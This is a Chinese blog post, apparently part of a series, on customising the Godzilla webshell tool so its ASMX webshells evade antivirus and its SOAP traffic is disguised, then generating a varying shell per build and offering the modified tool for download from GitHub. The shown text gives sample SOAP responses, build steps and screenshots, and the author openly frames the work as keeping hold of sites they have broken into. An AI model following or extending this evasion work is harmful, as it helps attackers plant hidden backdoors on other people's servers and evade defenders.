+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126180015692.png" alt="image-20250126180015692"></p>
+<p>先来看一下啊</p>
+<ul>
+<li><p><strong><code>&quot;http://tempuri.org/pass&quot;</code> 的含义</strong></p>
+<ul>
+<li><p><strong><code>http://tempuri.org/</code></strong></p>
+<ul>
+<li><p>这是一个占位命名空间（temporary URI），表示临时的命名空间。它通常用于默认的 Web 服务项目，表示尚未定义特定的命名空间。</p>
+</li>
+<li><p>在生产环境中，应替换为特定的命名空间，如：<br><code>http://example.com/myservice</code> 或其他规范的 URI。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>这个是必须的，下面传递的参数呢就是xml格式的，右边是返回的数据，可以看到左右追加的md5 16位。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;&lt;passResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;passResult&gt;11CD6A8758984163o8tM0853zU1IMnDChC5Kz8LDfyvxkgvjI4biZcqE8CaljtGledXoE+blv/pYFFNZ6C37AC826A2A04BC&lt;/passResult&gt;&lt;/passResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本来计划者做成下面这样的，就是将16字符串替换为<data></data>,这样伪装一下。但是没成功，</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;&lt;passResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;passResult&gt;&lt;data&gt;o8tM0853zU1IMnDChC5Kz8LDfyvxkgvjI4biZcqE8CaljtGledXoE+blv/pYFFNZ&lt;/data&gt;&lt;/passResult&gt;&lt;/passResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126181040305.png" alt="image-20250126181040305"></p>
+<p>这里可以看到我们将data写好之后。<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126181158838.png" alt="image-20250126181158838"></p>
+<p>可以清晰的看到就是，返回的&lt;&gt; 都被转义了。奈何笔者太菜了，查阅了很多资料，都没呀将尖括号就调整过来。不过这样看，也看不出来后面的=了。<code>&lt;soap:Body&gt;&lt;asdResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;asdResult&gt;&amp;lt;data&amp;gt;pKbveI07Gojru9gjm3HZ2nDxmEBZAUIUH0ifaEX3JQI=&amp;lt;data&amp;gt;&lt;/asdResult&gt;&lt;/asdResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></p>
+<p>其实你看这个返回包，其中这个最后的=像base64，但是，当<data></data>,进行url实体编码后，也好看一点了。其实主要还是将原来的16位去除掉，简单混淆一下。</p>
+<p>好，我们这里流量就先这样。奈何现在笔者这里没有安全设备，也没有办法去试试是否免杀，还希望大家在使用后，将效果告诉笔者，咱们在做改进。</p>
+<h5 id="asmx免杀木马生成"><a href="#asmx免杀木马生成" class="headerlink" title="asmx免杀木马生成"></a>asmx免杀木马生成</h5><p>好，接下来将我们的免杀封装到godzilla中，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126183223375.png" alt="image-20250126183223375"></p>
+<p>先做shell修改，简单修改一下</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126190855167.png" alt="image-20250126190855167"></p>
+<p>shell模板也替换一下，<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126190914539.png" alt="image-20250126190914539"></p>
+<p>好，接下来，build project，build artifacts。</p>
+<p>大家在使用的时候，asmx的木马在cshap中,<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126192127888.png" alt="image-20250126192127888"></p>
+<p>点击生成即可，还是推荐大家别用默认口令及密码。</p>
+<p>生成三份</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126192722085.png" alt="image-20250126192722085"></p>
+<p>都不一样，没啥问题。看下能不能用。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126192759491.png" alt="image-20250126192759491"></p>
+<p>大家使用的时候，选择<code>CShapDynamicPayload-&gt;CSHAP_ASMX_AES_BASE64_DATA</code>即可，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126193203603.png" alt="image-20250126193203603"></p>
+<p>使用起来也是没啥问题。好，这里我们就差不多改完了。</p>
+<p>上面提到推荐大家别用默认密钥及密码或者将密码密钥设为一样的。这里说一下为什么，就是我们访问木马的时候，其实是可以看到密码。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126194700390.png" alt="image-20250126194700390"></p>
+<p>就是这个，参数，其实这里就是密码，但不是密钥（key）。如果别访问到了，去猜你的密钥，你设置很简单，或者和密码相同，那么你辛辛苦苦打的站就被别人上车了。</p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>本文对godzilla中asmx木马进行免杀，及流量修改进行简单免杀，将免杀木马封装到godzilla中，使用模板进行免杀，达到每次生成的木马都不相同。</p>
+<h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>1.1版本添加木马的免杀，全语言都做好了，但是并没有改流量以及加密方式，只是做了伪装。</p>
+<p>1.2版本做了动态密钥。</p>
+<p>1.3版本做了左右动态添加数据，</p>
+<p>1.4版本做了asmx动态免杀及流量修改。</p>
+<p>后面需要做的：修改一下加密方式，这样的话会更好一点。还有就是message其实是固定的，希望能让他动起来。</p>
+<h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a target="_blank" rel="noopener" href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p>
+<h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。</p>
+<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            原版哥斯拉</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>emmm 太菜了<br>一直在路上</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://bohemian.top">bohemian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bohemian.top/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/">https://bohemian.top/2025/01/24/哥斯拉二开v1-0/哥斯拉二开从0到1-5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://bohemian.top" target="_blank">Bohemian</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/godzilla/">godzilla</a><a class="post-meta__tags" href="/tags/%E4%BA%8C%E5%BC%80/">二开</a><a class="post-meta__tags" href="/tags/asmx%E5%85%8D%E6%9D%80/">asmx免杀</a></div><div class="post-share"><div class="social-share" data-image="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">哥斯拉二开从0到1-4(流量优化)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">哥斯拉二开从0到1-6(jspx免杀)</div></div><div class="info-2"><div class="info-item-1">前言上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下jspx流量修改及免杀。 jspx简介JSPX (JavaServer Pages XML) 是一种基于 XML 语法的 JSP（JavaServer Pages）格式。它将 JSP 与 XML 的严格语法规则结合，确保页面中的所有标签都符合 XML 的结构要求。通过使用 JSPX，开发人员可以得到一个符合 XML 规范的页面，这在某些情况下非常重要，例如处理 XML 数据或需要与其他 XML 系统进行集成时。JSPX 就是 JSP 的 XML 版本，主要区别在于 XML 的严格语法要求。 看起来是aspx和asmx的关系差不多。就是XML版本的。 jspx免杀我们先来看一下Godzilla的jspx生成原版木马 12&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:declaration&gt; String...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-06</div><div class="info-item-2">哥斯拉二开从0到1-6(jspx免杀)</div></div><div class="info-2"><div class="info-item-1">前言上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下jspx流量修改及免杀。 jspx简介JSPX (JavaServer Pages XML) 是一种基于 XML 语法的 JSP（JavaServer Pages）格式。它将 JSP 与 XML 的严格语法规则结合，确保页面中的所有标签都符合 XML 的结构要求。通过使用 JSPX，开发人员可以得到一个符合 XML 规范的页面，这在某些情况下非常重要，例如处理 XML 数据或需要与其他 XML 系统进行集成时。JSPX 就是 JSP 的 XML 版本，主要区别在于 XML 的严格语法要求。 看起来是aspx和asmx的关系差不多。就是XML版本的。 jspx免杀我们先来看一下Godzilla的jspx生成原版木马 12&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:declaration&gt; String...</div></div></div></a><a class="pagination-related" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-22</div><div class="info-item-2">哥斯拉二开从0到1-4(流量优化)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-24</div><div class="info-item-2">哥斯拉二开从0到1-3(动态密钥)</div></div><div class="info-2"><div class="info-item-1">前言有小伙伴说，上面的文章都做了动态的免杀，每次生成的木马都不一样，还挺好的，还有没有什么东西可以做成动态的，我想了想，如果把我们的密钥做成动态的，那岂不是，简单的实现了动态加密。 前置知识首先我们来看，哥斯拉的加密传输过程  这里我们可以看到，有两个关键点，就是  pass和key pass就是传递的键，payload为值，payload是由key控制的，因为你每次需要发送的东西  都会进行异或一下。如果这里，我们把key设成动态的，那么也就是说，payload就会是动态的。当然，这不是重点，重点是，如果对方的安全设备上，捕获了我们的流量，他想解密我们在其中做了什么，那么就需要key解密，看图中的第八步，执行的结果需要xor才能获取值。好，如果我们的木马文件中，没有写key，或者把key写成动态的，如果他不知道key是什么，那么他就解不出来了我们做了什么了。当然，key是可以爆破的，就是比较麻烦了。 思路这里我们也可以想到，因为我们必须要传上去一个木马，木马中必定带key和pass，并且本地也需要知道这个key，去和服务端通信。如果客户端发送一个key ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/website/avatar.jpg" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="author-info-name">bohemian</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bohemiana"><i class="fab fa-github"></i><span>Go Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Bohemiana" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bohemian's blog</div></div><div class="card-widget aside aside-count"><div class="item-headline"><i class="fas fa-hourglass-half"></i><span>人生倒计时</span></div><div class="item-content"><div id="life-progress" ></div> <script src="https://cdn-js.moeworld.top/gh/qxdn/life-progress@latest/autoload.min.js"></script></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#asmx%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">asmx简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#asmx%E5%85%8D%E6%9D%80"><span class="toc-number">3.</span> <span class="toc-text">asmx免杀</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#asmx%E6%B5%81%E9%87%8F%E4%BF%AE%E6%94%B9"><span class="toc-number">4.</span> <span class="toc-text">asmx流量修改</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#asmx%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90"><span class="toc-number">5.</span> <span class="toc-text">asmx免杀木马生成</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E4%B8%AA%E7%89%88%E6%9C%AC"><span class="toc-number">7.</span> <span class="toc-text">下个版本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E3%80%81%E4%BD%BF%E7%94%A8"><span class="toc-number">8.</span> <span class="toc-text">下载、使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%B4%E8%B0%A2"><span class="toc-number">9.</span> <span class="toc-text">致谢</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">10.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-6(jspx免杀)"/></a><div class="content"><a class="title" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)">哥斯拉二开从0到1-6(jspx免杀)</a><time datetime="2025-02-06T02:21:52.000Z" title="发表于 2025-02-06 10:21:52">2025-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-5(asmx免杀)"/></a><div class="content"><a class="title" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)">哥斯拉二开从0到1-5(asmx免杀)</a><time datetime="2025-01-24T09:37:43.000Z" title="发表于 2025-01-24 17:37:43">2025-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-4(流量优化)"/></a><div class="content"><a class="title" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)">哥斯拉二开从0到1-4(流量优化)</a><time datetime="2025-01-22T01:53:00.000Z" title="发表于 2025-01-22 09:53:00">2025-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-3(动态密钥)"/></a><div class="content"><a class="title" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)">哥斯拉二开从0到1-3(动态密钥)</a><time datetime="2024-12-24T05:38:47.000Z" title="发表于 2024-12-24 13:38:47">2024-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="哥斯拉二开从0到1-2(免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-2(免杀)"/></a><div class="content"><a class="title" href="/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="哥斯拉二开从0到1-2(免杀)">哥斯拉二开从0到1-2(免杀)</a><time datetime="2024-11-18T01:55:05.000Z" title="发表于 2024-11-18 09:55:05">2024-11-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By bohemian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to my <a href="https://bohemian.top/">blog</a>!</div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xindong2020/ButterflyEffects/footer/heart.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://waline-git-main-bohemianas-projects.vercel.app/',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !true) {
+    if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="13186150757" data-server="netease" data-type="playlist" data-loop="all"  data-fixed="true" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: true,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
